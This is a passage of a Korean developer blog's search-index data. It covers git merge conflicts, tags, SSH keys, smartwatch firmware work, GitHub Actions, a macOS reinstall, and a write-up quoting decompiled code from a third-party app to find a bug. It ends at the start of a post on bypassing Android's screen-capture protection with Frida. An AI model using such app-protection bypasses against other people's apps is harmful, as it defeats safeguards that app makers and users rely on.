_sass/themes/light-syntax.scss.CONFLICT (file location): _sass/colors/light-typography.scss added in HEAD inside a directory that was renamed in next, suggesting it should perhaps be moved to _sass/themes/light-typography.scss.CONFLICT (modify/delete): tools/init.sh deleted in HEAD and modified in next. Version next of tools/init.sh left in tree.CONFLICT (modify/delete): tools/release.sh deleted in HEAD and modified in next. Version next of tools/release.sh left in tree.자동 병합이 실패했습니다. 충돌을 바로잡고 결과물을 커밋하십시오.j병합 충돌 해결하기현재 브랜치 master브랜치가 'origin/master'보다 28개 커밋 뒤에 있고, 앞으로 돌릴 수 있습니다. (로컬 브랜치를 업데이트하려면 \"git pull\"을 사용하십시오)병합하지 않은 경로가 있습니다. (충돌을 바로잡고 \"git commit\"을 실행하십시오) (병합을 중단하려면 \"git merge --abort\"를 사용하십시오)커밋할 변경 사항:\t새 파일: .github/workflows/pr-filter.yml\t새 파일: .github/workflows/scripts/pr-filter.js { . . . }\t수정함: _sass/main.scss\t이름 바꿈: _sass/layout/archives.scss -&gt; _sass/pages/_archives.scss\t이름 바꿈: _sass/layout/categories.scss -&gt; _sass/pages/_categories.scss\t이름 바꿈: _sass/layout/category-tag.scss -&gt; _sass/pages/_category-tag.scss\t이름 바꿈: _sass/layout/home.scss -&gt; _sass/pages/_home.scss\t새 파일: _sass/pages/_index.scss\t이름 바꿈: _sass/layout/post.scss -&gt; _sass/pages/_post.scss\t새 파일: _sass/pages/_search.scss\t이름 바꿈: _sass/layout/tags.scss -&gt; _sass/pages/_tags.scss\t이름 바꿈: _sass/colors/typography-dark.scss -&gt; _sass/themes/_dark.scss\t새 파일: _sass/themes/_light.scss\t삭제함: _sass/variables-hook.scss\t수정함: assets/css/jekyll-theme-chirpy.scss\t수정함: assets/feed.xml\t수정함: assets/lib\t수정함: docs/CHANGELOG.md\t수정함: jekyll-theme-chirpy.gemspec\t수정함: package.json\t삭제함: purgecss.config.js\t새 파일: purgecss.js\t수정함: rollup.config.js병합하지 않은 경로: (해결했다고 표시하려면 알맞게 \"git add/rm &lt;파일&gt;...\"을 사용하십시오)\t이 쪽에서 삭제: .github/workflows/cd.yml\t이 쪽에서 삭제: .github/workflows/ci.yml\t이 쪽에서 삭제: .github/workflows/commitlint.yml\t이 쪽에서 삭제: .github/workflows/publish.yml\t이 쪽에서 삭제: .github/workflows/stale.yml\t양쪽에서 수정: .gitignore\t양쪽에서 수정: _javascript/categories.js\t양쪽에서 수정: _javascript/misc.js\t양쪽에서 수정: _javascript/modules/components.js\t이 쪽에서 삭제: _posts/2019-08-09-getting-started.md\t저 쪽에서 삭제: _sass/addon/commons.scss\t이 쪽에서 추가: _sass/themes/dark-syntax.scss\t이 쪽에서 추가: _sass/themes/dark-typography.scss\t이 쪽에서 추가: _sass/themes/light-syntax.scss\t이 쪽에서 추가: _sass/themes/light-typography.scss\t이 쪽에서 삭제: tools/init.sh\t이 쪽에서 삭제: tools/release.shrm vs rm –cached병합 충돌을 해결할 때 위 명령어를 사용해야하고 또 다른 명령어나 복합적으로 확인해야 하는 사항들이 많을 수 있다. 이때 이번에 확인한 명령어에 한하여 정리해보려고 한다.$ git rm file위는 git 이 더 이상 특정 파일을 추적하지 않도록 삭제하는 명령어이다. delete 와 같다고 생각하면 편하다.$ git rm --cached file위는 git 이 더 이상 특정 파일을 추적하지 않도록 제외하는 명령어이다.기존 코드에 JS, CSS 반영하기업스트림 저장소에 의하면 새로 프로젝트를 시작하는게 아닌 기존에 이미 fork 를 한 상태로 고유의 커밋을 진행한 후 업스트림을 통해 태그를 패치할 경우에 대한 방법을 제시하고 있다. 먼저 npm run build 을 통해 생성되는 assets/js/, _sass/ 파일들을 git 이 추적할 수 있게 추가해줘야 한다. 이때 .gitignore 로 인해 추적에 제외된 파일이라 -f 옵션으로 추적이 가능하도록 설정해준다.$ git add assets/js/dist _sass/vendors -f정리해서 git 을 살펴보면 아래와 같다.* 678acda feat: some commit { }... }* b2cd432 fix: merge conflict|\\| * 3df83fd (tag: v7.2.0, upstream/production, origin/next, next) chore(release): 7.2.0| * 82ba82e Merge branch 'master' into production| |\\| | * 5265b03 feat: support vertical scrolling for toc in desktop mode (#2064)| | * 1164769 build(deps): update dependencies version| | * 5756b8f build(deps-dev): upgrade dependencies| | * 35c794c perf: modular sass architecture (#2052){ . . . }| | * e6b87d2 chore: remove `h1` element from site title (#1960)| | * 7374906 Merge branch 'production'| | |\\| | |/| |/|* | | c67dc67 fix: some commit { . . . }* | | cd78cd8 fix: some commit { . . . }위와 같이 현재 downstream 브랜치에 upstream 브랜치를 병합한 형태를 볼 수 있다.%%{ init: { 'theme': 'base', 'gitGraph': { 'showCommitLabel': true, 'mainBranchName': 'upstream' } }}%%gitGraph: commit \"test\" commit commit tag:\"v7.1.1\" commit branch downstream checkout downstream commit id: \"cd78cd8\" commit id: \"c67dc67\" checkout upstream commit type: HIGHLIGHT commit commit type: HIGHLIGHT commit type: HIGHLIGHT commit commit tag:\"v7.2.0\" id:\"3df83fd\" checkout downstream merge upstream id: \"b2cd432\" commit id:\"678acda\"정리하며여기까지 블로그 코어 태그를 병합하는 내용을 다뤄봤다. 이전에는 너무 밀려있어서 병합 충돌을 해결하는 것이 굉장히 쉽지 않았지만 한번 따라 잡으니까 수정하는 게 훨씬 수월해지는 것을 느낄 수 있다." }, { "title": "How to use tag", "url": "/posts/how_to_use_tag/", "categories": "git", "tags": "git", "date": "2024-11-27 11:48:33 +0900", "snippet": "버전 관리 관하여협업하고 있는 프로젝트에서 Release버전을 배포할 예정이라 Tag에 관한 개념을 간단하게 기록하였다.브랜치는 상황에 따라서 기능 구현을 위해 분기하거나 버전별로 나눌 때 사용한다. 좀 더 알아보니Main branch -&gt; TagDevelop branch -&gt; Main branch (Pull Request)위와 같이 코드를...", "content": "버전 관리 관하여협업하고 있는 프로젝트에서 Release버전을 배포할 예정이라 Tag에 관한 개념을 간단하게 기록하였다.브랜치는 상황에 따라서 기능 구현을 위해 분기하거나 버전별로 나눌 때 사용한다. 좀 더 알아보니Main branch -&gt; TagDevelop branch -&gt; Main branch (Pull Request)위와 같이 코드를 업데이트하는 것을 확인하고 가급적 어떤 작업을 하든 분기를 나눠 다른 분기에서 작업 후 메인 분기에 PR을 보내는 방식을 선호한다. 수정된 사항을 쉽게 확인하고 발견된 버그를 커밋 단위로 한 눈에 확인하기 위함이다. 메인 분기에서 작업 후 다이렉트로 커밋하는 것은 지양한다.Tag버전의 Release 형태 (수정 불가능)태그를 등록할 때 코멘트를 남길 때는 -a 또는 이름으로 또는 브랜치나 커밋 해쉬를 통해 태그를 등록할 수 있다.$ git tag [name]$ git tag [name] [commit-sha]원격 저장소에 태그를 올릴 때는 아래와 같이 사용한다.$ git push origin tag-nameTag 조회존재하는 태그를 확인할 때 git tag를 사용한다.$ git tagv5.3.0v5.3.1v5.3.2현재 존재하는 태그 목록 범위를 추린다면 git tag -l v1.1.*과 같이 사용합니다.$ git tag -l v5.3.*Tag 삭제존재하는 태그를 삭제할 때 브랜치 삭제와 비슷하게 아래와 같이 진행한다.$ git tag -d tag-name$ git push origin :tag-nameReleaseRelease 탭에서 태그나 브랜치를 기반으로 릴리즈를 만들 수 있다.Release from tagTarget으로 태그나 브랜치를 선택하고 Release title을 기입한다.(e.g. v1.0.0)Release 버전에 관하여 간단한 설명을 수록한다." }, { "title": "Upgrade Blog Core to v7.1.1 (feat. Jekyll)", "url": "/posts/upgrade_blog_core_to_v7_1_1/", "categories": "blog, git", "tags": "blog, git", "date": "2024-11-27 01:26:51 +0900", "snippet": "깃블로그를 운영하면서 오랜 시간 upstream 코어를 업데이트 하지 않았다.병합하고자 Pull Request 를 열었으나 무수히 많은 파일들이 변경되었고 또한 충돌을 바로 잡아야 하는 많은 파일들이 있었다.이를 해결하기 위하여 각 잡고 시간을 내어 충돌하는 부분을 하나씩 확인하고 올바르게 병합을 잡아주었다.근래에 병합을 시도하려고 했으나 많은 충돌로...", "content": "깃블로그를 운영하면서 오랜 시간 upstream 코어를 업데이트 하지 않았다.병합하고자 Pull Request 를 열었으나 무수히 많은 파일들이 변경되었고 또한 충돌을 바로 잡아야 하는 많은 파일들이 있었다.이를 해결하기 위하여 각 잡고 시간을 내어 충돌하는 부분을 하나씩 확인하고 올바르게 병합을 잡아주었다.근래에 병합을 시도하려고 했으나 많은 충돌로 미루고 미루다 이번 기회에 시도하게 되었다.Upstream 으로 부터 v7.1.1 병합 준비기존 기반은 ‘v6.0.0’ 을 기반으로 깃블로그를 운영하였으나 최근에 릴리즈된 ‘v7.1.1’ 을 따라가고자 Pull Request 를 열어 로컬에서 충돌을 확인하였다.단계별 확인하자면 아래와 같다.gitGraph: commit \"test\" commit commit tag:\"v6.0.0\" commit branch downstream checkout downstream commit commit commit checkout main commit type: HIGHLIGHT commit commit type: HIGHLIGHT commit type: HIGHLIGHT commit commit tag:\"v7.1.1\" commit위와 같이 upstream 과 downstream 이 따로 놀면서 여러 블로그 글에 관한 포스팅 커밋을 쌓아가서 병합하면 충돌이 나는 상태가 된다.gitGraph: commit \"test\" commit commit tag:\"v6.0.0\" commit branch downstream checkout downstream commit id: \"4cd65a7\" commit id: \"6b78c96\" commit id: \"cb7a98b\" checkout main commit type: HIGHLIGHT commit commit type: HIGHLIGHT commit type: HIGHLIGHT commit commit tag:\"v7.1.1\" merge downstream commit branch develop checkout develop commit commit어떠한 방향으로 병합을 하든 충돌을 피할 수 없어 먼저 위와 같이 downstream 브랜치를 upstream 브랜치에 병합을 해주고 merge 된 최종 commit 울 기반으로 새로 브랜치를 파면 되는데 이때 무수한 충돌을 해결하는 것이 필요하다. 이때 나는 rebase 를 진행해주어 각 커밋마다 충돌을 해결하였다.gitGraph: commit \"test\" commit commit tag:\"v6.0.0\" commit id: \"4cd65a7\" commit id: \"6b78c96\" commit id: \"cb7a98b\" commit type: HIGHLIGHT commit commit type: HIGHLIGHT commit type: HIGHLIGHT commit commit tag:\"v7.1.1\" commit히스토리가 정리되면 위와 같이 된다.병합 시 발생하는 충돌을 살펴보았는데 이외에도 굉장히 많은 케이스의 merge conflict 가 일어날 수 있다. 이를 대비하기 위해서는 항상 주기적으로 기본 브랜치의 커밋을 따라가도록 sync 를 맞춰줄 필요가 있으며 기본 브랜치에 큰 변경 사항이 생긴다면 (리팩토링 및 기능 추가 등) 그전에 기본 브랜치 기반으로 개발하는 브랜치들을 merge 또는 close 로 마무리하는 습관을 가지는 것을 권장한다." }, { "title": "How to use multiple git account ssh key in local", "url": "/posts/how_to_use_multiple_git_account_ssh_key_in_local/", "categories": "git", "tags": "git", "date": "2024-11-24 23:25:21 +0900", "snippet": "git 계정을 여러개 사용하다보면 ssh 를 설정했음에도 다른 계정의 저장소로 push 가 되지 않는 걸 경험할 수 있다.이때 간단한 구글링을 통해 해결 방법을 알 수 있었다.각 저장소에 어떤 SSH 키가 사용될지 확인하려면 SSH 구성에 구성을 추가하여 각 키를 특정 저장소에 연결해야 한다.ssh-add ~/.ssh/id_rsa_subssh 를 추가...", "content": "git 계정을 여러개 사용하다보면 ssh 를 설정했음에도 다른 계정의 저장소로 push 가 되지 않는 걸 경험할 수 있다.이때 간단한 구글링을 통해 해결 방법을 알 수 있었다.각 저장소에 어떤 SSH 키가 사용될지 확인하려면 SSH 구성에 구성을 추가하여 각 키를 특정 저장소에 연결해야 한다.ssh-add ~/.ssh/id_rsa_subssh 를 추가해준다.Host github.com Hostname github.com AddKeysToAgent yes UseKeychain yes IdentityFile ~/.ssh/id_rsa_mainHost github.com-sub Hostname github.com AddKeysToAgent yes UseKeychain yes IdentityFile ~/.ssh/id_rsa_sub그리고 clone 할 때 아래와 같이 진행해준다.git clone git@github.com-sub:username/repo.git이미 저장소가 있다면 remote url 을 변경해준다.git remote set-url origin git@github.com-sub:username/repo.git" }, { "title": "Open-smartwatch Time API 에 관한 고찰", "url": "/posts/refactoring_api_usage/", "categories": "open-smartwatch, open-source", "tags": "research, develop", "date": "2024-10-18 00:05:00 +0900", "snippet": "시작Watchfaces 를 보면 시계와 날짜를 가져오는 API 가 있다. 시간대별로 로컬 타임과 듀얼 타임을 가져올 수 있는데다음과 같은 API 로 열려 있다.uint32_t years = 0;uint32_t month = 0;uint32_t day = 0;OswHal::getInstance()-&gt;getTime(&amp;years, &amp;mo...", "content": "시작Watchfaces 를 보면 시계와 날짜를 가져오는 API 가 있다. 시간대별로 로컬 타임과 듀얼 타임을 가져올 수 있는데다음과 같은 API 로 열려 있다.uint32_t years = 0;uint32_t month = 0;uint32_t day = 0;OswHal::getInstance()-&gt;getTime(&amp;years, &amp;month, &amp;day);각 구하고자 하는 데이터의 주소를 넘겨주면 API 에서 현재 날짜를 데이터 주소에 넣어준다.그런데 이를 이상하게 보게 되었다.이걸 하나의 구조체로 만들면 어떨까 생각이 되었다.구조도OswTime, OswDate API Diagram위와 같은 구조도를 가지면서 OswHal 에 있는 OswDate 와 OswTime 자료구조를 통해 모든 시간과 날짜 매개변수를 대체한다.typedef struct { uint32_t year; uint32_t month; uint32_t day; uint32_t weekDay;} OswDate;이러한 자료구조를 추가하여 연도, 월, 일, 요일을 하나의 구조체로 통합하였다.OswDate oswDate = { };OswHal::getInstance()-&gt;getTime(oswDate);OSW_LOG_E(\"current day is \", oswDate.day);위와 같이 날짜를 가져올 수 있게 된다." }, { "title": "RollBack, Google Play system update", "url": "/posts/rollback_google_play_system_update/", "categories": "android", "tags": "android", "date": "2024-10-14 12:25:09 +0900", "snippet": "구글 플레이 시스템 업데이트구글 플레이 시스템 업데이트은 재부팅이 필요한 설치 작업인데 수동으로 가능하며 자동으로 업데아트 역시 가능하다.근래 사용하는 DBI 가 작동하지 않는 일이 발생하여 확인해보니 구글 플레이 시스템 업데아트 &lt;2024.8.1&gt; 가 적용된 단말기 모든 곳에서 발생하는 것으로 확인되었다.이에 따라 단말기를 깨끗하게 밀어버...", "content": "구글 플레이 시스템 업데이트구글 플레이 시스템 업데이트은 재부팅이 필요한 설치 작업인데 수동으로 가능하며 자동으로 업데아트 역시 가능하다.근래 사용하는 DBI 가 작동하지 않는 일이 발생하여 확인해보니 구글 플레이 시스템 업데아트 &lt;2024.8.1&gt; 가 적용된 단말기 모든 곳에서 발생하는 것으로 확인되었다.이에 따라 단말기를 깨끗하게 밀어버리고 시스템 업데이트와 모든 업데이트를 다 해제하고 재루팅 시도하였다.그런데 얼마 지나서 다시 시스템 업데이트가 되어 DBI 가 작동하지 않은 현상이 발생하였다.이에 따라 모든 업데이트가 해제된 것이 아니었으며 다른 방법을 찾아야했다.구글링 끝에 안드로이드 레퍼런스 사이트에서 구글 플레이 시스템 업데이트 롤백에 관한 내용이 있었다. 이에 따라 시스템 업데이트를 rollback 하는 과정을 적용하여 또 한 번 재루팅하는 불상사를 막을 수 있었다.좀 더 알아보니 해당 툴로 새로 펌웨어도 올릴 수 있는 것으로 보인다. 번거로운 작업으로 디바이스를 밀었는데 좀 더 편해질 수 있을 것으로 보인다." }, { "title": "Open-smartwatch protocol 분석 및 연구개발", "url": "/posts/osw_protocol_research/", "categories": "reverse-engineering, android, osw", "tags": "open-source, reverse-engineering, android, mobile, osw", "date": "2024-10-12 04:52:35 +0900", "snippet": "현재 개발하고 있는 스마트워치를 살펴보면 UI 적으로나 기능적으로 끌어올리고 있다. 센서 데이터를 통해서 가공하여 여러 앱으로 정보를 표현하는 Fitness App 을 만들었다. 그때 이러한 데이터와 동시에 모바일 데이터를 조합해 연동하여 더 기능을 확장하고 많은 API 와 데이터를 가공하려고 한다.먼저 연동 시 사용하는 프로토콜에 대해서 알아봐야 하...", "content": "현재 개발하고 있는 스마트워치를 살펴보면 UI 적으로나 기능적으로 끌어올리고 있다. 센서 데이터를 통해서 가공하여 여러 앱으로 정보를 표현하는 Fitness App 을 만들었다. 그때 이러한 데이터와 동시에 모바일 데이터를 조합해 연동하여 더 기능을 확장하고 많은 API 와 데이터를 가공하려고 한다.먼저 연동 시 사용하는 프로토콜에 대해서 알아봐야 하는데 시중에 기성 앱으로 사용되는 앱들의 프로토콜 데이터를 확인해볼 수 있다. 개발 시 기성 앱에 디바이스를 연결하여 오고가는 데이터를 역공학으로 캡쳐하고 해당 포로토콜 기반으로 Open-smartwatch 역시 그 기준을 맞춰가고자 한다. 본문에서는 Open-smartwatch 에서 개발된 프로토콜에 대한 spec 과 BLE 앱에서 송수신 되는 데이터에 대한 style 을 다룰 것이다.OSW 프로토콜을 통한 클라이언트로 데이터 전송 규격BLE 프로토콜을 후킹하여 read 와 write 할 때 송수신 데이터 확인위는 BLE protocol 에서 송수신하는 부분을 확인하여 데이터를 확인하는 부분이다. 디바이스에서 전송되는 데이터에 대해서 어플리케이션에서 확인하는 것을 볼 수 있고 여러 차례 시도 시 실시간으로 반영되는 값을 볼 수 있다.이에 대한 데이터 전송 포멧은 아래와 같다.OSW 에서 전송하는 uint32_t 에 대한 전송 규격위는 단일 데이터에 대한 전송 규격에 대한 설계이다.디바이스의 데이터는 16진수 형태로 변환되며 디바이스에서 전송하는 표준 데이터는 4바이트 크기의 uint32 데이터이다. BLE 디바이스에서 지원하는 데이터 송신 규격은 1바이트이며 이를 보내기 위해 16진수 형태에서 1바이트로 쪼개기 위해 시프트 연산으로 8비트씩 나누어 진행하고 1바이트의 배열 형식으로 담는다.OSW 에서 전송하는 uint32_t[] 에 대한 전송 규격위는 멀티 데이터에 대한 전송 규격에 대한 설계이다.디바이스의 데이터는 16진수 형태로 변환되며 디바이스에서 전송하는 표준 데이터는 4바이트 크기의 uint32 데이터이다. BLE 디바이스에서 지원하는 데이터 송신 규격은 1바이트이며 이를 보내기 위해 16진수 형태에서 1바이트로 쪼개기 위해 시프트 연산으로 8비트씩 나누어 진행하고 1바이트의 배열 형식으로 담는다.멀티 데이터 경우 전송할 배열 크기만큼 추가적으로 갯수를 필요로한다.uint32 경우 uint8 로 전송하기 위해 uint8_t[4] 이 필요하다. 만약 uint32_t[7] 배열 형식의 데이터를 보내야 한다면 uint8_t[4 * 7], 그러니까 uint8_t[28] 이 필요하다.모바일 연결 연동GadgetBridge 에서 client 로 연결위는 프로토타입으로 구현된 기능으로 모바일 어플리케이션에서 디바이스를 연결시도한 케이스이다.현재 부분으로 서버 부분을 구현하고 클라이언트 부분을 연동하도록 개발하려고 한다.다음에는 본격적으로 클라이언트를 개발하고자 한다. 가능하면 모든 모바일을 통용하는 SDK 형태로 개발하는 방향을 생각하고 있으나 먼저 기성 플랫폼으로 개발된 어플리케이션에 포팅하여 테스트를 진행하고 후후 계획에서 개발을 진행하고자 한다." }, { "title": "GitHub Action 시간 줄이기", "url": "/posts/ci_cd_optimization/", "categories": "github-action, osw", "tags": "", "date": "2024-10-09 15:09:32 +0900", "snippet": "개발을 위한 개선예전에 GitHub Action 을 개선하면서 빌드 시간을 절반 이상 단축시킨 일화가 있다. 그 당시에 오픈소스 프로젝트 개선을 위해 시도한 것보다 프로젝트를 개발하고 각 모델과 버전에 따른 빌드 결과를 확인하려면 1 시간이 넘는 작업시간이 걸려서 이러한 결과를 당연하게 생각했었다. 일상의 불편함을 당연하게 생각을 하면 안 된다는 관점...", "content": "개발을 위한 개선예전에 GitHub Action 을 개선하면서 빌드 시간을 절반 이상 단축시킨 일화가 있다. 그 당시에 오픈소스 프로젝트 개선을 위해 시도한 것보다 프로젝트를 개발하고 각 모델과 버전에 따른 빌드 결과를 확인하려면 1 시간이 넘는 작업시간이 걸려서 이러한 결과를 당연하게 생각했었다. 일상의 불편함을 당연하게 생각을 하면 안 된다는 관점을 갖게 되었고 게을러지는 순간 나태해진다는 느낌을 강하게 받았다. 이후로 GitHub Action 을 개선하고 빌드 시간을 단축하고자 연구했다. 기존 워크플로우는 일렬로 하나의 모델 하나의 언어 하나의 하드웨어를 순차적으로 빌드하여 진행하는 워크플로우를 진행하였다. 그러다 개발 버전에서 커밋했을 때 각 모델에 대한 빌드 결과를 빨리 확인하고자 워크플로우를 개선할 수 있는 방법을 찾아보았다.1. 기존 Workflows위는 기존 워크픞로우 형식이다. 워크플로우를 진행하고 워크플로우 내부에서 빌드 스크립트를 구현하여 존재하는 모델과 지원하는 언어를 전부 빌드한다.a. Build Script위와 같은 형태로 빌드 스크립트를 작성하여 지원하는 언어와 현재 배포된 혹은 실험중인 테스트 모델들에 대해 컴파일을 진행한다. 이때 순차적으로 진행하는 특징이 있어 모든 모델들이 빌드되기까지 시간이 꽤 걸린다. 이때 이 문제를 포착하여 어떻게 하면 빌드 시스템을 단축하고 좀 더 획기적인 구조로 개선로 만들 수 있을까 고민을 시작했다.개선된 워크플로우아래는 고민 끝에 여러 아이디어로 개선한 워크플로우 구조이다.2. New Workflows위는 개선된 워크플로우 모습이다. 워크플로우 내부에서 Matrix 키워들을 사용하여 지원하는 언어와 배포/실험중인 하드웨어를 선언한다. 이는 보통 하나의 워크플로우 다양한 버전의 테스트를 진행할 때 사용한다. 언어와 하드웨어 모델을 뽑아내면 내부에서 병렬 구조로 빌드를 시작하여 기존에 걸리는 시간에 절반 이하로 감소하는 것을 볼 수 있다.결과 비교최근 기능 개선을 위한 Pull Request 를 올린적이 있는데 개선된 워크폴루우 소요시간은 아래와 같다.개선된 워크플로우 시간기존 워크플로우를 따른다면 아래와 같은 시간이 걸린다.기존 워크플로우 시간" }, { "title": "메세지 미리보기 실패 부분 역공학", "url": "/posts/why_not_working_image_preview/", "categories": "research, android", "tags": "research, android", "date": "2024-06-15 13:28:43 +0900", "snippet": "README 해당 게시글은 버그 및 기능에 대한 연구/분석 목적이며 그 외로 활용할 경우 책임지지 않습니다.분석메세지를 미리보기로 읽을 수 있는 앱이 있다.너무 잘 사용하고 있는 꽤 재밌는 앱이다.어느 순간 사진을 프리뷰 형태로 볼 수 없어서 패치되길 기다렸는데 수정이 되지 않아 한번 그 내부에 어떤 문제가 있는지 살펴보았다.이때 기존 사용하는 구글...", "content": "README 해당 게시글은 버그 및 기능에 대한 연구/분석 목적이며 그 외로 활용할 경우 책임지지 않습니다.분석메세지를 미리보기로 읽을 수 있는 앱이 있다.너무 잘 사용하고 있는 꽤 재밌는 앱이다.어느 순간 사진을 프리뷰 형태로 볼 수 없어서 패치되길 기다렸는데 수정이 되지 않아 한번 그 내부에 어떤 문제가 있는지 살펴보았다.이때 기존 사용하는 구글의 정적 분석 툴과 자주 사용하던 툴이 있었는데 조금 변형하여 버그 찾기에 용이하도록 패치 후 사용했다.앱 버전은 다음과 같다.android:versionCode=\"418\" android:versionName=\"1.8.2.2\"미리보기 실패한 사진 부분메니페스트에 알림을 리스너 영역을 확인해본다. &lt;service android:exported=\"true\" android:name=\"com.alpha.beta.redacted\" android:permission=\"android.permission.BIND_NOTIFICATION_LISTENER_SERVICE\"&gt; &lt;intent-filter&gt; &lt;action android:name=\"android.service.notification.NotificationListenerService\"/&gt; &lt;/intent-filter&gt; &lt;/service&gt;아래에서 알림이 올 때 호출되는 Posted 부분을 볼 수 있다. @Override // android.service.notification.NotificationListenerService public void onNotificationPosted(StatusBarNotification statusBarNotification0) { Notification notification0 = statusBarNotification0.getNotification(); if(notification0 != null &amp;&amp; ((notification0.flags &amp; 2) == 0 &amp;&amp; (notification0.flags &amp; 0x20) == 0 &amp;&amp; (notification0.flags &amp; 0x200) == 0 &amp;&amp; notification0.extras != null)) { String s = statusBarNotification0.getPackageName(); if(!a.b(this, \"allow_all_app\", false) &amp;&amp; ((\"android\".equals(s)) || !\"com.kakao.talk/jp.naver.line.android/kr.co.vcnc.android.couple/com.instagram.android/com.whatsapp/com.nhn.android.band/com.facebook.katana/com.facebook.orca/com.viber.voip/org.telegram.messenger/com.tencent.mobileqq/com.tencent.mobileqqi/com.tencent.mm/com.discord/com.twitter.android/com.kakao.talk\".contains(s))) { return; } try { this.i(notification0, s); } catch(IllegalArgumentException illegalArgumentException0) { com.google.firebase.crashlytics.a.a().d(illegalArgumentException0); } return; } }중간에 this.i() 를 실행하는 걸 볼 수 있다. private void i(Notification notification0, String s) { Context context0 = this.getApplicationContext(); if(context0 == null) { return; } Bitmap bitmap0 = m.d(context0, notification0.extras); this.f(); this.c.execute(new Runnable() { @Override public void run() { d d0 = redacted.this.a; m.i(context0, notification0, s, bitmap0, d0).g(new g() { public void a(c c0) { redacted.this.e(com.alpha.beta.redacted.b.this.b, c0, com.alpha.beta.redacted.b.this.d); } }).e(new s4.f() { @Override // s4.f public void c(Exception exception0) { com.google.firebase.crashlytics.a.a().d(exception0); } }); } }); }실행 후 내부 m.i() 를 진입하는 걸 확인한다. public static j i(Context context0, Notification notification0, String s, Bitmap bitmap0, d d0) { s4.b b0 = new s4.b(); s4.k k0 = new s4.k(b0.b()); if(context0 == null) { k0.b(new NullPointerException(\"Context is null\")); return k0.a(); } Bundle bundle0 = notification0.extras; if(bundle0 == null) { k0.b(new NullPointerException(\"Bundle is null\")); return k0.a(); } c c0 = new c(bundle0, notification0.when, s, notification0.tickerText); if(!c0.O() &amp;&amp; !c0.M(d0) &amp;&amp; !m.j(c0.F())) { // 영어와 한글에 대한 조건문 분류 if((c0.L(\"photo\")) || (c0.L(\"사진\")) || (bundle0.containsKey(\"android.wearable.EXTENSIONS\")) &amp;&amp; !\"com.google.android.gm\".equals(s)) { File file1 = context0.getExternalFilesDir(Environment.DIRECTORY_PICTURES); if(file1 != null) { c0.Y(context0, notification0, file1.getAbsolutePath(), \"photo\"); } } else if((c0.L(\"emoticon\")) || (c0.L(\"이모티콘\"))) { File file0 = context0.getExternalFilesDir(Environment.DIRECTORY_PICTURES); if(file0 != null) { c0.Y(context0, notification0, file0.getAbsolutePath(), \"&gt;&gt;EMO&gt;\"); } } m.g(c0, m.e(context0, c0, bitmap0)); k0.c(c0); return k0.a(); } b0.a(); return k0.a(); }위에서 보면 사진에 대한 메세지를 가져오는 부분이 있다.처음에 보면 특별한 문제가 없어 보이지만 첫 사진에 봤을 때 Upper case Photo 인 것을 볼 수 있다.디바이스 언어 환경이 영어일 때 알림을 읽는 부분에서 알림 API 에서 Photo 와 Emoticon 을 주는데 조건 필터링이 Lower case 를 취하고 있어 case 가 맞지 않아 사진 미리보기가 정상적으로 진행되지 않은 것을 확인할 수 있다.실제로 한국어로 디바이스를 세팅하면 사진 읽는데 문제가 없다.정상적인 사진 미리보기문제에 대하여 개발자에 메일로 첨부하였고 현재는 패치된 버전이 플레이스토어에 배포되었다." }, { "title": "An error occurred while preparing the installation", "url": "/posts/an_error_occurred_while_preparing_the_installation/", "categories": "macOS, sierra", "tags": "macOS, sierra, factory-reset", "date": "2024-06-05 19:56:14 +0900", "snippet": "서론근래 macOS 를 초기화해야 하는 일이 생겼다. 근데 난관에 마주했는데 초기화도 잘 안 되고 인터넷에 모든 시도가 의미가 없다는 것이었다. 수리비는 분명 많이 나올 것이고 수리하러 간다고 하더라도 고쳐줄지 아니면 그냥 새거 사라고 할지 모르는 판이라 굉장히 심각한 사태였다.이 글에서는 이런 사태를 100% 성공적으로 해결하여 윈도우와 리눅스 설치...", "content": "서론근래 macOS 를 초기화해야 하는 일이 생겼다. 근데 난관에 마주했는데 초기화도 잘 안 되고 인터넷에 모든 시도가 의미가 없다는 것이었다. 수리비는 분명 많이 나올 것이고 수리하러 간다고 하더라도 고쳐줄지 아니면 그냥 새거 사라고 할지 모르는 판이라 굉장히 심각한 사태였다.이 글에서는 이런 사태를 100% 성공적으로 해결하여 윈도우와 리눅스 설치법에 감사함을 느끼게 되는 글이다.인터넷에 널린 비슷한 문제들우선 내가 시도한 방법들은 아래와 같다.인터넷을 통해 재설치하면 되지 않을까?인터넷 설치를 진행하면 응용프로그램을 준비하는 동안 문제가 발생했다고 나오면서 기다린 시간을 모욕하는 상황이 벌어진다.지구본 그림이 나오면서 한 10분정도 기다리고 사과마크가 지나갈 때까지 또 5분정도 기다렸다가재설치한다면서 다운받을 때 30분을 보내는데 마지막에 가슴 설레면서 기대했다가 몇십번을 통수 맞았다.문제의 원인부팅 USB 를 만들어서 재설치하면 되지 않을까?sierra OS 가 설치된 맥에서만 USB 를 만들 수 있다고 한다.윈도우에서 가능하다고 하는 Transmac, 이걸로 5번 정도 삽질했는데 끝내 원하는 결과를 얻을 수 없다는 검색을 보고서 마음을 접었다.이미지를 직접 다운받기아래는 해결한 방법을 작성해보았다.시간이 올바른지 확인한다.date올바르지 않으면 업데이트를 해준다.ntpdate -u time.apple.com디렉터리로 들어간다.cd /Volumes/Macintosh_HDmacOS Sierra 10.12.6 InstallOS.dmg 를 Apple.com 에서 다운받는다. 해당 파일은 4.7GB 정도라 중간에 실패할 수 있는데 그냥 다시 다운받으면 된다.curl http://{원하는 OS 버전}/InstallOS.dmg -o InstallOS.dmgInstallOS.dmg 를 마운트한다.$ hdiutil attach InstallOS.dmgInstall macOS Sierra.app 을 Macintosh HD volume 에 InstallOS.dmg 으로부터 설치한다.installer -pkg /Volumes/Install\\ macOS/InstallOS.pkg -target /Volumes/Macintosh_HDSierra installer 를 시작할 수 있다./Volumes/Macintosh_HD/Applications/Install\\ macOS\\ Sierra.app/Contents/MacOS/Installassistant_springboard로컬에 다운받은 이미지로 설치하기 때문에 인터넷을 통해 설치하는 것과는 차원이 다를 정도로 굉장히 빨리 설치된다.그러면 아래와 같은 화면을 볼 수 있을 것이다.성공적으로 재설치 완료" }, { "title": "How to disable android anti-capture", "url": "/posts/how_to_disable_android_anti-capture/", "categories": "android, research, tool", "tags": "tool, frida", "date": "2024-06-01 08:50:23 +0900", "snippet": "다양한 앱을 사용하다보면 사진을 캡쳐하고 싶을 때가 있다. 안드로이드 기종에서는 이 기능을 간편하게 지원해주는데 일부 앱에서는 이 캡쳐 기능을 보안과 도용 방지를 위해 기술적으로 차단하려고 한다. 오늘은 해당 방법을 알아보고 우회하는 걸 재연해보려고 한다.FLAG_SECUREpublic class MainActivity extends AppCompat...", "content": "다양한 앱을 